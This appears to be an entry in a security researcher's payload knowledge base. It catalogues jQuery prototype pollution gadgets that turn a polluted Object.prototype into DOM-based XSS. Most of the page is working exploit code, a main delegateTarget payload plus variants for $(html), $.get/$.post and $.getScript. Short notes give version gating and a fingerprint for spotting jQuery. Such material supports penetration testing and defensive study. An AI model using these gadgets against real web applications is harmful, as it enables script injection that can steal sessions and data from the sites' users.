---
title: Prototype Pollution — jQuery XSS Gadgets
slug: pp-jquery-gadgets
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/prototype-pollution, sink/jquery]
inbound: []
---

# Prototype Pollution — jQuery XSS Gadgets

## Payload

```javascript
// jQuery $(x).off — delegateTarget gadget
Object.prototype.preventDefault='x';
Object.prototype.handleObj='x';
Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';
$(document).off('foobar');
```

## Variants

```javascript
// jQuery $(html) — div array gadget
Object.prototype.div=['1','<img src onerror=alert(1)>','1']
$('<div x="x"></div>')

// jQuery $.get / $.post — dataType + url gadget (>=3.0.0)
Object.prototype.url = ['data:,alert(1)//'];
Object.prototype.dataType = 'script';
$.get('https://google.com/');
$.post('https://google.com/');

// jQuery $.getScript — src gadget (>=3.4.0)
Object.prototype.src = ['data:,alert(1)//']
$.getScript('https://google.com/')

// jQuery $.getScript — url gadget (3.0.0–3.3.1)
Object.prototype.url = 'data:,alert(1)//'
$.getScript('https://google.com/')

// jQuery $(x).on — event injection
Object.prototype.on = 'click';
$('body').on('click', function() { alert('Injected Event'); });
$('body').trigger('click');
```

## Context

Each gadget requires (a) a prototype pollution source on the same page that can write to `Object.prototype`, and (b) jQuery loaded. The `delegateTarget` gadget poisons the event delegation path so that jQuery's `.off()` serializes an attacker-controlled HTML string into `innerHTML`. The `div` array gadget corrupts jQuery's HTML-parsing internal structure. The `$.get`/`$.getScript` gadgets inject a `data:` script URL as the request target. Version gating matters: the `src` gadget requires jQuery ≥ 3.4.0. Fingerprint: `typeof $.fn.jquery !== 'undefined'`.

## Provenance

- Distilled from: `../../techniques/dom-xss/prototype-pollution-xss.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Prototype Pollution to XSS](../../techniques/dom-xss/prototype-pollution-xss.md)
